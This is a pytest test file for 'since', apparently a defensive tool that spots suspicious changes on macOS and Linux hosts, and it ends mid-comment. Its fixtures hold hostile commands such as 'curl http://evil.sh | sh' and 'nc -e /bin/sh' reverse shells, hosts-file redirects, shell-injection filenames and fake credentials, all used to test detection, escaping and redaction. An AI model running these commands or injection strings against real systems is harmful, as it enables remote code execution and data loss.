"""Unit tests for since. Pure-function + synthetic-snapshot coverage — no reliance
on the host's real system state, so they run anywhere. Focus is the logic that the
code review found bugs in (severity routing, port surfacing, injection-safety,
privilege guard, corruption tolerance) plus the core diff/time primitives.

Run:  python3 -m pytest   (or just: pytest)
"""
import contextlib
import json
import os
import shlex
import shutil
import signal
import time

import pytest

import since


# --------------------------------------------------------------------------- helpers
def snap(collectors=None, blobs=None, root=False, epoch=None):
    s = {
        "schema": since.SCHEMA_VERSION, "platform": "macos",
        "created": "2026-07-24T09:00:00",
        "epoch": epoch if epoch is not None else int(time.time()),
        "root": root, "euid": 0 if root else 501, "errors": {},
        "collectors": {k: {} for k in since.CAT}, "blobs": blobs or {},
    }
    for k, v in (collectors or {}).items():
        s["collectors"][k] = v
    return s


@pytest.fixture(autouse=True)
def _no_history(monkeypatch):
    # deterministic: no attribution from the test runner's shell history
    monkeypatch.setattr(since, "_HISTORY", [])


# --------------------------------------------------------------------------- time
def test_parse_when_forms():
    now = time.time()
    assert abs(now - since.parse_when("1d") - 86400) < 5
    assert abs(now - since.parse_when("12h") - 43200) < 5
    assert abs(now - since.parse_when("yesterday") - 86400) < 5
    assert since.parse_when("3 hours ago") < now
    assert since.parse_when("an hour ago") < now
    # weekday resolves to a past midnight
    assert since.parse_when("monday") < now


def test_parse_when_rejects_garbage():
    with pytest.raises(ValueError):
        since.parse_when("next thursday-ish")


# --------------------------------------------------------------------------- diff
def test_diff_dicts():
    a, r, c = since.diff_dicts({"x": 1, "y": 2}, {"y": 9, "z": 3})
    assert a == ["z"] and r == ["x"] and c == ["y"]


def test_base_level():
    assert since.base_level("persistence", "added") == since.ORANGE
    assert since.base_level("software", "added") == since.YELLOW
    assert since.base_level("network", "removed") == since.GREEN


# --------------------------------------------------------------------------- injection safety (C3/M6/M4)
def test_undo_launch_item_is_shell_safe(monkeypatch):
    monkeypatch.setattr(since, "PLATFORM", "macos")
    mal = "~/Library/LaunchAgents/x'$(touch /tmp/pwned)'.plist"
    real = mal.replace("~", str(since.HOME), 1)
    hint = since.undo_hint("launch_items", mal, None)
    assert shlex.quote(real) in hint          # the payload is fully quoted
    assert "$(touch /tmp/pwned) 2>" not in hint  # never sits outside quoting


def test_undo_login_item_uses_argv(monkeypatch):
    monkeypatch.setattr(since, "PLATFORM", "macos")
    hint = since.undo_hint("login_items", 'Evil" name', None)
    assert "item 1 of argv" in hint
    assert shlex.quote('Evil" name') in hint


def test_undo_daemon_uses_system_domain(monkeypatch):
    monkeypatch.setattr(since, "PLATFORM", "macos")
    hint = since.undo_hint("launch_items", "/Library/LaunchDaemons/evil.plist", None)
    assert "bootout system" in hint and hint.count("sudo") >= 2


def test_undo_pkg_names_quoted():
    assert shlex.quote("x; rm -rf ~") in since.undo_hint("npm_global", "x; rm -rf ~", None)


# --------------------------------------------------------------------------- terminal-escape + secret hygiene (H1/M5)
def test_clean_strips_control_and_escape():
    out = since.clean("Evil\x1b[2Kname\x07\x00")
    assert "\x1b" not in out and "\x07" not in out and "\x00" not in out


def test_redact_masks_secrets():
    assert "SECRET" not in since.redact("//r/:_authToken=SECRETVALUE")
    assert "«redacted»" in since.redact("export API_KEY=abcdef123")
    assert "«redacted»" in since.redact("-----BEGIN OPENSSH PRIVATE KEY-----")
    # a normal line is untouched
    assert since.redact("alias ll='ls -la'") == "alias ll='ls -la'"


# --------------------------------------------------------------------------- malicious patterns (L2)
@pytest.mark.parametrize("line", [
    "curl http://evil.sh | sh",
    "wget -qO- evil | bash",
    "echo x | base64 -d | sh",
    "sh <(curl http://evil)",
    "nc -e /bin/sh 10.0.0.1 4444",
    "0.0.0.0 www.apple.com",
    "127.0.0.1 www.mybank.com",
])
def test_malicious_patterns_match(line):
    assert any(p.search(line) for p, _ in since.MALICIOUS_PATTERNS), line


@pytest.mark.parametrize("line", ["127.0.0.1 localhost", "255.255.255.255 broadcasthost",
                                  "alias g=git", "export EDITOR=vim"])
def test_malicious_patterns_no_false_positive(line):
    assert not any(p.search(line) for p, _ in since.MALICIOUS_PATTERNS), line


# --------------------------------------------------------------------------- C1: escalated inventory item is ranked
def test_unsigned_app_escalates_and_is_loud(monkeypatch):
    monkeypatch.setattr(since, "trust_of", lambda p: ("unsigned", True))
    b = snap()
    c = snap(collectors={"applications": {"EvilApp": "/Applications"}})
    findings = since.build_findings(b, c)
    app = next(f for f in findings if f["category"] == "applications")
    assert app["level"] == since.RED
    out = since.render(findings, b, c, [], [])
    assert "Worth a look" in out and "signature: unsigned" in out


# --------------------------------------------------------------------------- C2: new port on known listener
def test_new_port_on_known_listener_surfaces():
    b = snap(collectors={"listening": {"postgres": "5432"}})
    c = snap(collectors={"listening": {"postgres": "4444,5432"}})
    findings = since.build_findings(b, c)
    lf = [f for f in findings if f["category"] == "listening"]
    assert any(f.get("added_ports") == ["4444"] for f in lf)


def test_full_port_turnover_is_suppressed():
    b = snap(collectors={"listening": {"rapportd": "5000,6000"}})
    c = snap(collectors={"listening": {"rapportd": "5001,6002"}})
    findings = since.build_findings(b, c)
    assert not [f for f in findings if f["category"] == "listening"]


# --------------------------------------------------------------------------- H3: privilege-sensitive blobs
def test_priv_blob_skipped_on_mismatch():
    b = snap(blobs={"/etc/sudoers": "root ALL\n", "crontab (current user)": "0 5 * * * x\n"}, root=True)
    c = snap(blobs={})
    kept = since.build_findings(b, c, skip_cats=since.PRIV_SENSITIVE_CATS, skip_priv_blobs=True)
    assert not [f for f in kept if since._is_priv_blob(f["key"])]
    # control: without the skip they DO appear
    naive = since.build_findings(b, c)
    assert [f for f in naive if f["key"] == "/etc/sudoers"]


# --------------------------------------------------------------------------- H4/M5: storage
def test_write_private_is_atomic_and_0600(tmp_path):
    p = tmp_path / "sub" / "snap.json"
    since._write_private(p, '{"ok": 1}')
    assert p.exists() and (p.stat().st_mode & 0o777) == 0o600
    assert json.loads(p.read_text()) == {"ok": 1}


def test_safe_load_tolerates_corruption_and_wrong_shape(tmp_path):
    good = tmp_path / "good.json"
    good.write_text(json.dumps({"created": "2026-07-24T09:00:00", "epoch": 1, "collectors": {}}))
    assert since.safe_load(good)["epoch"] == 1
    for junk in ('{"epoch": 1', "{}", "[]", '{"epoch": 1}', '"a string"'):  # truncated OR valid-but-wrong-shape
        p = tmp_path / "x.json"; p.write_text(junk)
        assert since.safe_load(p) is None, junk


# --------------------------------------------------------------------------- render never emits raw escapes (H1)
def test_render_emits_no_raw_escape():
    b = snap()
    c = snap(collectors={"login_items": {"Evil\x1b[2Kname\x07": "x"}})
    out = since.render(since.build_findings(b, c), b, c, [], [])
    assert "\x1b" not in out and "\x07" not in out


# --------------------------------------------------------------------------- severity ordering
def test_clean_strips_newline_and_bidi():
    # a newline in a name would inject a forged extra output line (H1 reopened)
    assert "\n" not in since.clean("legit\n  signature: Apple-signed")
    assert "\r" not in since.clean("a\rb")
    assert "\x1b" not in since.clean("a\x1b[31mb")   # ESC still stripped
    # TAB is deliberately KEPT (v2 audit #11): it cannot forge a line, and stripping it
    # mangled tab-indented config diffs. Newline/CR/ESC (which CAN forge) stay stripped.
    assert since.clean("a\tb") == "a\tb"
    assert since.clean("x‮y") == "x�y"   # bidi override
    assert since.clean("x​y") == "x�y"   # zero-width space
    assert since.clean("a" + chr(0x2028) + "b") == "a�b"   # U+2028 line separator (finding 6)
    assert since.clean("a" + chr(0x2029) + "b") == "a�b"   # U+2029 paragraph separator
    # lone UTF-16 surrogate (non-UTF-8 Linux filename via surrogateescape) — must be
    # neutralized, not raise UnicodeEncodeError when the report is printed (v2 audit #7)
    assert since.clean("a\udc80b") == "a�b"
    assert since.clean("normal name") == "normal name"


def test_render_cannot_be_line_injected():
    # login item whose NAME contains newlines trying to forge a standalone
    # "signature: Apple-signed" / "undo: rm -rf ~" line
    b = snap()
    c = snap(collectors={"login_items": {"evil\n  signature: Apple-signed\n  undo: rm -rf ~": "x"}})
    out = since.render(since.build_findings(b, c), b, c, [], [])
    stripped = [l.strip() for l in out.splitlines()]
    # the forged text must NOT appear as its own line (newline injection defeated)
    assert "signature: Apple-signed" not in stripped
    assert "undo: rm -rf ~" not in stripped
    # it survives only harmlessly inline within one mangled name line
    assert any("signature: Apple-signed" in l and l.startswith("🟠") for l in stripped)


@pytest.mark.parametrize("line,secret", [
    ("Authorization: Bearer eyJ0.SECRETBODY.sig", "SECRETBODY"),
    ("GITHUB_TOKEN=ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", "ghp_ABCDEF"),
    ("aws_access_key_id = AKIAIOSFODNN7EXAMPLE", "AKIAIOSFODNN7EXAMPLE"),
    ("clone https://user:hunter2@host/x", "hunter2"),
    ("//r/:_authToken=SEKRIT", "SEKRIT"),
])
def test_redact_no_leak(line, secret):
    assert secret not in since.redact(line)


def test_redact_no_false_positive_on_nopasswd():
    line = "deploy ALL=(ALL) NOPASSWD: ALL"
    assert since.redact(line) == line   # the security-critical token must stay visible


def test_removed_port_on_kept_listener_surfaces():
    b = snap(collectors={"listening": {"node": "3000,3001"}})
    c = snap(collectors={"listening": {"node": "3001"}})   # dropped 3000, kept 3001
    lf = [f for f in since.build_findings(b, c) if f["category"] == "listening"]
    assert lf and lf[0].get("removed_ports") == ["3000"]


def test_priv_blob_covers_all_cron():
    for k in ("/etc/sudoers", "crontab (current user)", "/etc/crontab", "/etc/cron.d/x"):
        assert since._is_priv_blob(k), k
    assert not since._is_priv_blob("~/.zshrc")


def test_linux_undo_hints(monkeypatch):
    monkeypatch.setattr(since, "PLATFORM", "linux")
    assert since.undo_hint("launch_items", "nginx.service", None) == "sudo systemctl disable --now -- nginx.service"
    assert since.undo_hint("launch_items", "user:foo.service", None) == "systemctl --user disable --now -- foo.service"
    assert since.undo_hint("kernel_extensions", "evil_rk", None).startswith("sudo modprobe -r evil_rk")
    assert since.undo_hint("brew", "nginx", None).startswith("sudo apt remove -- nginx")
    assert since.undo_hint("brew", "code (snap)", None) == "sudo snap remove -- code"
    assert since.undo_hint("login_items", "x.desktop", None).startswith("rm -- ")
    # attacker-chosen names are still shlex-quoted on Linux
    assert shlex.quote("a; rm -rf ~") in since.undo_hint("brew", "a; rm -rf ~", None)


def test_linux_labels(monkeypatch):
    # the label override map is applied only when PLATFORM=='linux'
    assert since.CAT["brew"]["label"] in ("Homebrew packages", "System packages (apt/dnf/…)")


def test_platform_note(monkeypatch):
    for supported in ("macos", "linux"):
        monkeypatch.setattr(since, "PLATFORM", supported)
        assert since.platform_note() is None
    monkeypatch.setattr(since, "PLATFORM", "sunos")   # genuinely unsupported
    note = since.platform_note()
    assert note and "UNSUPPORTED" in note and "sunos" in note


def test_findings_sorted_most_severe_first(monkeypatch):
    monkeypatch.setattr(since, "trust_of", lambda p: (None, False))
    b = snap()
    c = snap(collectors={"login_items": {"a": "a"}},
             blobs={"~/.zshrc": None, "/etc/hosts": "0.0.0.0 www.bank.com\n"})
    # /etc/hosts redirect is RED, login item is ORANGE
    findings = since.build_findings(b, c)
    levels = [f["level"] for f in findings]
    assert levels == sorted(levels, reverse=True)


# =========================================================================== #
# Second independent (Kimi) audit — regression tests for each fixed finding.   #
# =========================================================================== #

# #2 — over-redaction must NOT conceal the sshd/sudoers attacks the tool exists to
# surface. Keyword-in-KEY is not enough; the VALUE (a path, a keyword, a short flag)
# must still be shown so a malicious change is visible.
@pytest.mark.parametrize("line", [
    "AuthorizedKeysFile /tmp/evil/keys",   # attacker redirects trusted keys — must SHOW the path
    "PasswordAuthentication no",
    "PermitRootLogin yes",
    "    NOPASSWD: /bin/bash",
    "%admin ALL=(ALL) NOPASSWD: ALL",
    "# basic networking setup",            # #6 benign prose under _SCHEME_RE
    "# no secret here",                    # sensitive word in KEY, short prose value
    "AuthorizedKeysCommandUser nobody",    # directive-name substring + plain-word value
    "AuthorizedKeysCommandUser root",
    "password required pam_unix.so",       # pam directive: credential word + keyword value
    # 3rd-pass independent audit (finding 2): the DEFAULT sshd form uses a RELATIVE path —
    # an absolute-only directive test let this stay hidden.
    "AuthorizedKeysFile .ssh/authorized_keys",
    "AuthorizedKeysFile %h/.ssh/authorized_keys",
    "AuthorizedKeysCommandUser sshd-keygen",
])
def test_redact_does_not_hide_directives(line):
    assert since.redact(line) == line, "value redacted away — this is exactly what #2 warned about"


# A malicious edit to an AuthorizedKeys* directive must produce a VISIBLE diff, incl. the
# relative-path default form (finding 2: both old and new were redacting to the same string).
def test_redact_authorizedkeys_change_is_visible():
    assert (since.redact("AuthorizedKeysFile .ssh/authorized_keys")
            != since.redact("AuthorizedKeysFile .ssh/evilkeys"))


# #2/#10 — real credentials are masked: single-class tokens, SSHPASS, short values, AND
# (3rd-pass finding 1) values that begin with '/', '~', or '$' — base64 tokens contain '/',
# crypt/shadow hashes begin with '$', so a "looks like a path" bypass would leak them.
@pytest.mark.parametrize("line,secret", [
    ("password=hunter2longtoken", "hunter2longtoken"),
    ("SSHPASS=Sup3rSecret1", "Sup3rSecret1"),
    ("//r/:_authToken=SECRETVALUE", "SECRETVALUE"),      # single-class (all upper) — entropy test would leak this
    ("client_secret: aGVsbG8gd29ybGQxMg==", "aGVsbG8gd29ybGQxMg=="),
    ("passcode=1234", "1234"),                           # short secret via assignment — must NOT leak
    ("password=abc", "abc"),
    ("SSHPASS=$ecretPassw0rd", "ecretPassw0rd"),         # value begins with '$'
    ("//registry.npmjs.org/:_authToken=/AbCdEf123456xyz", "AbCdEf123456xyz"),  # begins with '/'
    ("client_secret=/wJalrXUtnFEMIK7MDENGbPxRfiCY", "wJalrXUtnFEMIK7MDENGbPxRfiCY"),
    ("password=$6$rounds=5000$abcdefLONGhash", "abcdefLONGhash"),   # /etc/shadow crypt hash
    ("_auth=dXNlcjpwYXNz", "dXNlcjpwYXNz"),              # npm base64 basic-auth field
])
def test_redact_still_masks_real_secrets(line, secret):
    assert secret not in since.redact(line)


# =========================================================================== #
# Third full-tool independent audit — regression tests for each fixed finding. #
# =========================================================================== #

# Finding 1 — curl/netrc `user:pass` credentials (`~/.curlrc` is a TRACKED file) must be
# masked; _URLAUTH_RE misses them because they aren't a `://…@` URL.
@pytest.mark.parametrize("line,secret", [
    ('user = "alice:S3cr3tCurlPass"', "S3cr3tCurlPass"),
    ("-u bob:hunter2", "hunter2"),
    ("--proxy-user pu:ppw", "ppw"),
    ("curl -u carol:pw123 https://api.example.com", "pw123"),
    # diff lines carry a +/- marker in the real pipeline — the anchor must survive it
    # (an integration run caught this leaking where the bare-line unit test did not).
    ('+user = "victim:SuperSecretCurlPw123"', "SuperSecretCurlPw123"),
    ('-user = "victim:SuperSecretCurlPw123"', "SuperSecretCurlPw123"),
])
def test_redact_masks_curl_userpass(line, secret):
    assert secret not in since.redact(line)


# End-to-end: one realistic compromised diff through the REAL build_findings+render
# pipeline must (a) escalate malware persistence, (b) keep an sshd redirect VISIBLE,
# (c) REDACT a planted secret in rendered output, (d) neutralize a line-forging name.
# This integration test caught a curlrc leak the isolated redact() unit tests missed.
def test_end_to_end_adversarial_diff(monkeypatch):
    monkeypatch.setattr(since, "trust_of", lambda p: (None, False))
    b = snap(blobs={"~/.bashrc": "export PATH=$HOME/bin\n",
                    "/etc/ssh/sshd_config": "AuthorizedKeysFile .ssh/authorized_keys\n",
                    "~/.curlrc": "silent\n"})
    c = snap(collectors={"login_items": {"Evil\n  signature: Apple-signed\n  undo: rm -rf ~": "x"}},
             blobs={"~/.bashrc": "export PATH=$HOME/bin\ncurl http://evil.sh | sh\n",
                    "/etc/ssh/sshd_config": "AuthorizedKeysFile /tmp/attacker/keys\n",
                    "~/.curlrc": 'silent\nuser = "victim:SuperSecretCurlPw123"\n'})
    findings = since.build_findings(b, c)
    out = since.render(findings, b, c, [], [])
    lines = out.splitlines()
    assert any(f["level"] == since.RED and "bashrc" in f["key"] for f in findings)  # malware -> RED
    assert "/tmp/attacker/keys" in out                                             # sshd redirect visible
    assert "SuperSecretCurlPw123" not in out                                       # secret redacted
    assert not any(l.strip() == "signature: Apple-signed" for l in lines)          # no forged line
    assert not any(l.strip() == "undo: rm -rf ~" for l in lines)


def test_redact_curl_userpass_no_false_positive():
    # no colon → no password embedded → leave it alone
    assert since.redact("user = alice") == "user = alice"
    assert since.redact("# the user configuration: enabled") == "# the user configuration: enabled"


# Finding 2 — a systemd ExecStart swap on an already-enabled unit must change the
# fingerprint (parity with the macOS plist content hash). Proven with a mocked
# `systemctl show` (no real systemd needed).
def test_linux_service_execstart_swap_detected(monkeypatch):
    def fake_run(cmd, **kw):
        if "list-unit-files" in cmd:
            return "evil.service enabled\n"
        if "show" in cmd:
            return f"Id=evil.service\nExecStart={fake_run.exec}\n"
        return ""
    fake_run.exec = "{ path=/usr/bin/true ; argv[]=/usr/bin/true }"
    monkeypatch.setattr(since, "run", fake_run)
    before = since._linux_services()["evil.service"]
    fake_run.exec = "{ path=/tmp/miner ; argv[]=/tmp/miner }"   # same unit, enabled, swapped Exec
    after = since._linux_services()["evil.service"]
    assert before != after, "ExecStart swap invisible — finding 2 not fixed"


# Finding 3 — sudoers.d and the cron.* dirs / spool are privilege-sensitive blobs.
@pytest.mark.parametrize("key", [
    "/etc/sudoers.d/mygrant", "/etc/cron.daily/evil", "/etc/cron.hourly/x",
    "/var/spool/cron/crontabs/root", "/etc/crontab", "/etc/ld.so.preload",
])
def test_priv_blob_covers_sudoers_and_cron_family(key):
    assert since._is_priv_blob(key)


# Finding 4 — an absurd `--since` window must not dump an uncaught OverflowError traceback.
def test_parse_when_absurd_window_no_crash():
    assert since.parse_when("9" * 400 + "d") == 0   # graceful: cut off at epoch (oldest wins)
    assert since.parse_when("1d") > 0                # normal path intact


# #3 — PEM / raw-key body must be masked on the REMOVED (`-`) diff line too, not only `+`.
def test_redact_pem_body_parity_on_minus_line():
    body = "A" * 60
    assert "A" * 60 not in since.redact("-" + body)
    assert "A" * 60 not in since.redact("+" + body)
    assert since.redact("-" + body).startswith("-")   # marker preserved


# #1 — redact() must not go quadratic on an attacker-plantable long rc-file line.
def test_redact_not_quadratic():
    line = "secret=" + "A" * 40000 + "."
    t = time.time()
    since.redact(line)
    assert time.time() - t < 1.0, "redact() is super-linear — a crafted line can stall the daily digest"


# #7 — a lone UTF-16 surrogate (non-UTF-8 Linux filename) must not crash rendering.
def test_clean_surrogate_is_printable():
    out = since.clean("evil\udc80.desktop")
    out.encode("utf-8")   # would raise UnicodeEncodeError before the fix


# #4 — Linux autostart fingerprint folds in a CONTENT hash, so a swapped Exec= (Name=
# unchanged) is detected as a change instead of being invisible.
def test_linux_autostart_detects_exec_swap(monkeypatch, tmp_path):
    monkeypatch.setattr(since, "HOME", tmp_path)
    ad = tmp_path / ".config/autostart"
    ad.mkdir(parents=True)
    entry = ad / "x.desktop"
    entry.write_text("[Desktop Entry]\nName=Updater\nExec=/usr/bin/true\n")
    before = since._linux_autostart()
    entry.write_text("[Desktop Entry]\nName=Updater\nExec=/tmp/miner\n")   # same Name=, evil Exec
    after = since._linux_autostart()
    assert before["x.desktop"] != after["x.desktop"], "Exec swap invisible — #4 not fixed"


# L-f — tilde() collapses only a LEADING $HOME, not every occurrence.
def test_tilde_collapses_only_leading_home(monkeypatch, tmp_path):
    monkeypatch.setattr(since, "HOME", tmp_path)
    h = str(tmp_path)
    assert since.tilde(h + "/data" + h + "/file") == "~/data" + h + "/file"
    assert since.tilde(h) == "~"


# #9 — ld.so.preload (a classic rootkit hook, may be root-only-readable) is treated as a
# privilege-sensitive blob so a root/non-root mismatch can't fabricate an add/remove alarm.
def test_ld_so_preload_is_priv_blob():
    assert since._is_priv_blob("/etc/ld.so.preload")


# L-m — _write_private survives a stale temp left by a crashed run (no O_EXCL crash).
def test_write_private_survives_stale_temp(tmp_path):
    target = tmp_path / "snap.json"
    (tmp_path / f".{target.name}.stale.tmp").write_text("junk")   # pre-existing temp
    since._write_private(target, "hello")
    assert target.read_text() == "hello"
    assert oct(target.stat().st_mode)[-3:] == "600"


# =========================================================================== #
# Third independent (Kimi) audit v3 — a regression test per fixed finding.     #
# =========================================================================== #

class _Hang(BaseException):
    """BaseException on purpose: the collectors wrap their reads in `except Exception`,
    which would SWALLOW a plain TimeoutError and make a hang look like a pass."""


@contextlib.contextmanager
def deadline(seconds=5.0):
    """Fail (don't wedge the suite) if the body blocks — the only honest way to test a
    hang: a blocking FIFO read cannot be detected by inspecting a return value."""
    def _boom(signum, frame):
        raise _Hang(f"blocked >{seconds}s — the read is not guarded")
    old = signal.signal(signal.SIGALRM, _boom)
    signal.setitimer(signal.ITIMER_REAL, seconds)
    try:
        yield
    finally:
        signal.setitimer(signal.ITIMER_REAL, 0)
        signal.signal(signal.SIGALRM, old)


# v3 #1 (High) — a planted FIFO / device symlink in a monitored dir must not hang the
# collector. Unguarded, each of these blocks forever inside take_snapshot(), so the daily
# `digest --notify` never prints, never saves, never notifies: a silently dead watchdog.
def test_is_regular_rejects_fifo_and_device(tmp_path):
    fifo = tmp_path / "f"
    os.mkfifo(fifo)
    dev = tmp_path / "z"
    os.symlink("/dev/zero", dev)
    real = tmp_path / "r"
    real.write_text("x")
    link = tmp_path / "l"
    os.symlink(real, link)                  # symlink TO a regular file is still fine
    assert since.is_regular(real) and since.is_regular(link)
    assert not since.is_regular(fifo) and not since.is_regular(dev)
    assert not since.is_regular(tmp_path)   # a directory is not a readable file either
    assert not since.is_regular(tmp_path / "missing")


def test_launch_items_survive_fifo_and_report_it(monkeypatch, tmp_path):
    monkeypatch.setattr(since, "HOME", tmp_path)
    d = tmp_path / "Library/LaunchAgents"
    d.mkdir(parents=True)
    os.mkfifo(d / "evil.plist")
    os.symlink("/dev/zero", d / "zero.plist")
    with deadline():
        out = since._mac_launch_items()
    # reported, not silently dropped: a FIFO in LaunchAgents is itself anomalous
    assert "not a regular file" in out["~/Library/LaunchAgents/evil.plist"]
    assert "not a regular file" in out["~/Library/LaunchAgents/zero.plist"]


def test_linux_autostart_survives_fifo_and_reports_it(monkeypatch, tmp_path):
    monkeypatch.setattr(since, "HOME", tmp_path)
    monkeypatch.setattr(since, "SYS_AUTOSTART_DIR", tmp_path / "nonexistent")
    d = tmp_path / ".config/autostart"
    d.mkdir(parents=True)
    os.mkfifo(d / "evil.desktop")
    with deadline():
        out = since._linux_autostart()
    assert "not a regular file" in out["evil.desktop"]


@pytest.mark.parametrize("collector,ext_path", [
    ("_mac_browser_extensions",
     "Library/Application Support/Google/Chrome/Default/Extensions/abcd/1.0"),
    ("_linux_browser_extensions",
     ".config/google-chrome/Default/Extensions/abcd/1.0"),
])
def test_browser_extensions_survive_fifo_manifest(monkeypatch, tmp_path, collector, ext_path):
    monkeypatch.setattr(since, "HOME", tmp_path)
    d = tmp_path / ext_path
    d.mkdir(parents=True)
    os.mkfifo(d / "manifest.json")
    with deadline():
        out = getattr(since, collector)()
    # the extension is still inventoried (by id) — only the unreadable manifest is skipped
    assert any(k.endswith(":abcd") for k in out), out


def test_linux_browser_extensions_skip_temp_dir(monkeypatch, tmp_path):
    monkeypatch.setattr(since, "HOME", tmp_path)
    (tmp_path / ".config/google-chrome/Default/Extensions/Temp").mkdir(parents=True)
    assert not any(k.endswith(":Temp") for k in since._linux_browser_extensions())


# v3 #2 (Medium) — `Authorization: <token>` IS the credential and must be masked; the
# `Authorized*` sshd directives must stay visible (they differ from index 8 on).
@pytest.mark.parametrize("line", [
    '+header = "Authorization: c2VjcmV0dG9rZW4xMjM0"',
    '+Authorization: Token c2VjcmV0dG9rZW4xMjM0',
    '+Authorization: c2VjcmV0dG9rZW4xMjM0',
])
def test_authorization_header_is_redacted(line):
    assert "c2VjcmV0dG9rZW4xMjM0" not in since.redact(line)


@pytest.mark.parametrize("line", [
    "+AuthorizedKeysFile /tmp/evil/keys",
    "+AuthorizedKeysFile .ssh/authorized_keys",
    "+AuthorizedKeysCommandUser nobody",
    "+proxy_set_header Authorization $http_authorization;",
])
def test_authorized_directives_still_visible(line):
    assert since.redact(line) == line


# v3 #3 (Medium) — redact() is bounded ABSOLUTELY: a keyword-free long line short-circuits
# on the linear pre-filter, and any line is capped at _REDACT_MAX before the regexes run.
# `--json` redacts every diff line, so an unbounded per-line cost stalls the whole digest.
def test_redact_is_bounded_on_huge_lines():
    for line in ("+user " + "a" * 400_000, "+password=" + "a" * 400_000):
        t = time.time()
        out = since.redact(line)
        assert time.time() - t < 0.5, "redact() cost is not bounded"
        assert len(out) < since._REDACT_MAX + 200
    assert "truncated" in since.redact("+user " + "a" * 400_000)
    assert "«redacted»" in since.redact("+password=" + "a" * 400_000)


def test_redact_prefilter_matches_the_matcher():
    # The soundness invariant of the short-circuit: anything _ASSIGN_RE can match, the cheap
    # pre-filter must also match — otherwise that key silently stops being redacted.
    # (`authoriz` is deliberately SOFT: it gates the shown `Authorized*` directives.)
    for kw in ("secret", "passwd", "password", "passphrase", "token", "api_key",
               "access-key", "client_secret", "private_key", "authoriz", "_auth",
               "credential", "authorization"):
        line = f"+x{kw}y=SoMeV4lue"
        assert since._ASSIGN_RE.search(line), kw      # the matcher fires
        assert since._KV_KW_RE.search(line), kw       # …so the pre-filter must too
        if kw != "authoriz":                          # every HARD keyword still redacts
            assert "«redacted»" in since.redact(line), kw


# v3 #4 (Low) — a sudoers `PASSWD:` TAG prefixes a command list; redacting it hid the
# attack. The carve-out is value-shape gated, so a real `PASSWD=<secret>` still redacts.
@pytest.mark.parametrize("line", [
    "+eviluser ALL=(ALL) PASSWD: /tmp/miner",
    "+eviluser ALL=(ALL) PASSWD: ALL",
    "+eviluser ALL=(ALL) NOPASSWD: /tmp/miner",
])
def test_sudoers_passwd_tag_shows_command_list(line):
    assert since.redact(line) == line


@pytest.mark.parametrize("line", ["+PASSWD=hunter2Mixed", "+PASSWD: hunter2Mixed",
                                  "+passwd: hunter2Mixed"])
def test_passwd_assignment_still_redacted(line):
    assert "hunter2Mixed" not in since.redact(line)


# v3 #5 (Low) — the two XDG autostart dirs hold same-named files; a bare basename key let
# the system copy overwrite (hide) a planted user entry, and the undo hint pointed `rm` at
# the wrong directory for system entries.
def test_autostart_user_and_system_entries_do_not_collide(monkeypatch, tmp_path):
    monkeypatch.setattr(since, "HOME", tmp_path)
    sysdir = tmp_path / "xdg"
    sysdir.mkdir()
    monkeypatch.setattr(since, "SYS_AUTOSTART_DIR", sysdir)
    user = tmp_path / ".config/autostart"
    user.mkdir(parents=True)
    (user / "x.desktop").write_text("[Desktop Entry]\nName=Evil\nExec=/tmp/miner\n")
    (sysdir / "x.desktop").write_text("[Desktop Entry]\nName=Benign\nExec=/usr/bin/true\n")
    out = since._linux_autostart()
    assert "x.desktop" in out and "x.desktop (system)" in out
    assert "Evil" in out["x.desktop"] and "Benign" in out["x.desktop (system)"]


def test_autostart_undo_hint_targets_the_right_dir(monkeypatch, tmp_path):
    monkeypatch.setattr(since, "PLATFORM", "linux")
    monkeypatch.setattr(since, "HOME", tmp_path)
    assert since.undo_hint("login_items", "x.desktop", None) == \
        f"rm -- {shlex.quote(str(tmp_path / '.config/autostart/x.desktop'))}"
    assert since.undo_hint("login_items", "x.desktop (system)", None) == \
        "sudo rm -- /etc/xdg/autostart/x.desktop"


# v3 #6 (Low) — the ' (~/Applications)' disambiguator is not part of the app's PATH; with
# it, trust_of() got a path that never exists, so an unsigned app there never hit RED.
def test_user_applications_app_is_trust_checked(monkeypatch):
    seen = []
    monkeypatch.setattr(since, "trust_of", lambda p: (seen.append(p) or ("unsigned", True)))
    f = {"category": "applications", "action": "added", "key": "Evil (~/Applications)",
         "value": "/Users/x/Applications", "level": since.GREEN, "label": "app"}
    since._enrich(f, {})
    assert seen == ["/Users/x/Applications/Evil.app"]
    assert f["level"] == since.RED, "unsigned app in ~/Applications must escalate"


def test_bare_key_strips_only_our_own_tags():
    assert since.bare_key("Evil (~/Applications)") == "Evil"
    assert since.bare_key("code (snap)") == "code"
    assert since.bare_key("rectangle (cask)") == "rectangle"
    assert since.bare_key("x.desktop (system)") == "x.desktop"
    assert since.bare_key("Final Cut Pro (2024)") == "Final Cut Pro (2024)"   # not ours
    assert since.bare_key("plain") == "plain"


# v3 #9 (Low) — a tagged key can never whole-word-match a history line, so casks/snaps
# silently got no "why" attribution at all.
def test_cask_attribution_uses_bare_key(monkeypatch):
    monkeypatch.setattr(since, "_HISTORY", ["brew install --cask rectangle"])
    f = {"category": "brew", "action": "added", "key": "rectangle (cask)",
         "value": "0.7", "level": since.GREEN, "label": "brew package"}
    since._enrich(f, {})
    assert f["why"] == "brew install --cask rectangle"


# v3 #7 (Low) — labels.json that is valid JSON of the WRONG type crashed `since mark`
# (TypeError) and prune_snapshots (AttributeError). Same shape-validation as safe_load.
@pytest.mark.parametrize("junk", ['["a","b"]', '"str"', '42', 'null',
                                  '{"ok": "f.json", "bad": 5, "7": {"x": 1}}'])
def test_corrupt_labels_file_does_not_crash(monkeypatch, tmp_path, junk):
    monkeypatch.setattr(since, "STATE_DIR", tmp_path)
    monkeypatch.setattr(since, "SNAP_DIR", tmp_path / "snapshots")
    monkeypatch.setattr(since, "LABELS_FILE", tmp_path / "labels.json")
    (tmp_path / "labels.json").write_text(junk)
    labels = since.load_labels()
    assert isinstance(labels, dict)
    assert all(isinstance(k, str) and isinstance(v, str) for k, v in labels.items())
    since.save_snapshot(snap(), label="x")          # TypeError before the fix
    since.prune_snapshots()                          # AttributeError before the fix
    assert since.load_labels()["x"].endswith(".json")


# v3 #8 (Low) — os.geteuid() is Unix-only; called at import it crashed win32 before the
# honest "UNSUPPORTED PLATFORM" notice could print. (The win32 path itself is untestable here.)
def test_euid_is_indirected():
    assert since.EUID == os.geteuid()
    assert since.IS_ROOT == (os.geteuid() == 0)
    assert "uname" not in since.take_snapshot.__code__.co_names   # no Unix-only host call


# v3 #9 (Low) — the state dir was excluded by SUBSTRING, which also excluded a sibling
